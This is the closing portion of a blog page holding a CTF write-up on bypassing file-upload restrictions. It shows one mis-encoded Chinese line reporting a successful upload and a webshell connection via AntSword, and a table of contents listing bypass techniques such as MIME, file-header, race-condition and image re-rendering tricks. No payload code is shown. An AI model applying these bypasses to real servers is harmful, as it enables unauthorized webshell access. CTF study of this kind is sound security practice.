</span></span></code></pre></div><p><figure><img src="/ox-hugo/2022-05-03_17-43-07_screenshot.png" width="700px"/>
</figure>
 <!-- raw HTML omitted --></p>
<p>‰∏ä‰º†ÊàêÂäü‰ΩøÁî®ËöÅÂâëËøûÊé•ÊàêÂäü <!-- raw HTML omitted --></p>

</section>


    <footer class="article-footer">
    
    <section class="article-tags">
        
            <a href="/tags/file_upload/">file_upload</a>
        
            <a href="/tags/security/">security</a>
        
            <a href="/tags/server_side_vul/">server_side_vul</a>
        
    </section>


    
    <section class="article-copyright">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
</svg>



        <span>Licensed under CC BY-NC-SA 4.0</span>
    </section>
    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            Last updated on May 03, 2022 17:43 BST
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.css"integrity="sha384-RZU/ijkSsFbcmivfdRBQDtwuwVqK7GMOw6IMvKyeWL2K5UAlyp6WonmB8m7Jd0Hn"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/katex.min.js"integrity="sha384-pK1WpvzWVBQiP0/GjnvRxV4mOb0oxFuyRxJlk6vVw146n3egcN5C925NCP7a7BY8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.13.13/dist/contrib/auto-render.min.js"integrity="sha384-vZTG03m&#43;2yp6N6BNi5iM4rW4oIwk5DfcNdFfxkk9ZWpDriOkXX8voJBFrAO7MpVl"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
        renderMathInElement(document.querySelector(`.article-content`), {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ]
        });})
</script>
    
</article>

    

    

<aside class="related-contents--wrapper">
    <h2 class="section-title">Related contents</h2>
    <div class="related-contents">
        <div class="flex article-list--tile">
            
                
<article class="">
    <a href="/posts/xss_challenge_trip/">
        
        

        <div class="article-details">
            <h2 class="article-title">XSS ÊåëÊàò‰πãÊóÖ</h2>
        </div>
    </a>
</article>
            
                
<article class="">
    <a href="/posts/sqli_blind_injection/">
        
        

        <div class="article-details">
            <h2 class="article-title">SQLÊ≥®ÂÖ•ÔºöÁõ≤Ê≥®</h2>
        </div>
    </a>
</article>
            
        </div>
    </div>
</aside>

     
    
        
    <div class="disqus-container">
    <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "medicwrf" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</div>

<style>
    .disqus-container {
        background-color: var(--card-background);
        border-radius: var(--card-border-radius);
        box-shadow: var(--shadow-l1);
        padding: var(--card-padding);
    }
</style>

<script>
    window.addEventListener('onColorSchemeChange', (e) => {
        if (DISQUS) {
            DISQUS.reset({
                reload: true
            });
        }
    })
</script>

    

    <footer class="site-footer">
    <section class="copyright">
        &copy;
        
        2022 Under The Ginkgo
    </section>

    <section class="powerby">
        
            Cogito, ergo sum <br/>
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.11.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
    </script>
    <section class="powerby">
      <span id="busuanzi_container_site_pv" style='display:none'>
        Viwe <span id="busuanzi_value_site_pv"></span> times
      </span>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
            >

            </main>
    <aside class="sidebar right-sidebar sticky">
        
            
                
    <section class="widget archives">
        <div class="widget-icon">
            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <line x1="5" y1="9" x2="19" y2="9" />
  <line x1="5" y1="15" x2="19" y2="15" />
  <line x1="11" y1="4" x2="7" y2="20" />
  <line x1="17" y1="4" x2="13" y2="20" />
</svg>



        </div>
        <h2 class="widget-title section-title">Table of contents</h2>
        
        <div class="widget--toc">
            <nav id="TableOfContents">
  <ul>
    <li><a href="#file-upload-ggctf-upload">File Upload: ggctf-upload</a>
      <ul>
        <li><a href="#js">JS</a>
          <ul>
            <li><a href="#Ëß£Ê≥ï‰∏Ä-ÊäìÂåÖ‰øÆÊîπÁôΩÂêçÂçï">Ëß£Ê≥ï‰∏ÄÔºöÊäìÂåÖ‰øÆÊîπÁôΩÂêçÂçï</a></li>
            <li><a href="#Ëß£Ê≥ï‰∫å-Á¶ÅÁî®js">Ëß£Ê≥ï‰∫åÔºöÁ¶ÅÁî®JS</a></li>
            <li><a href="#Ëß£Ê≥ï‰∏â-js-debug">Ëß£Ê≥ï‰∏âÔºöJS debug</a></li>
          </ul>
        </li>
        <li><a href="#Ëß£Êûê‰∏ä‰º†">Ëß£Êûê‰∏ä‰º†</a></li>
        <li><a href="#mime-ÁªïËøá">MIME ÁªïËøá</a></li>
        <li><a href="#Êñá‰ª∂Â§¥ÁªïËøá">Êñá‰ª∂Â§¥ÁªïËøá</a></li>
        <li><a href="#ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å1">ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å1</a></li>
        <li><a href="#ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å2">ÊúâÁº∫Èô∑ÁöÑ‰ª£Á†Å2</a></li>
        <li><a href="#Âè§ËÄÅÁöÑÊºèÊ¥û-1">Âè§ËÄÅÁöÑÊºèÊ¥û - 1</a></li>
        <li><a href="#Âè§ËÄÅÁöÑÊºèÊ¥û-2">Âè§ËÄÅÁöÑÊºèÊ¥û - 2</a></li>
        <li><a href="#ÈªëÂêçÂçïÁº∫Èô∑">ÈªëÂêçÂçïÁº∫Èô∑</a></li>
        <li><a href="#Êù°‰ª∂Á´û‰∫â">Êù°‰ª∂Á´û‰∫â</a></li>
        <li><a href="#‰∫åÊ¨°Ê∏≤Êüì">‰∫åÊ¨°Ê∏≤Êüì</a>
          <ul>
            <li><a href="#gif">GIF</a></li>
            <li><a href="#png">PNG</a></li>
            <li><a href="#jpg">JPG</a></li>
          </ul>
        </li>
        <li><a href="#move-uploaded-file-ÁªïËøá">move_uploaded_file ÁªïËøá</a></li>
        <li><a href="#‰ª£Á†ÅÂÆ°ËÆ°">‰ª£Á†ÅÂÆ°ËÆ°</a></li>
      </ul>
    </li>
  </ul>
</nav>
        </div>
    </section>

            
        
    </aside>


        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
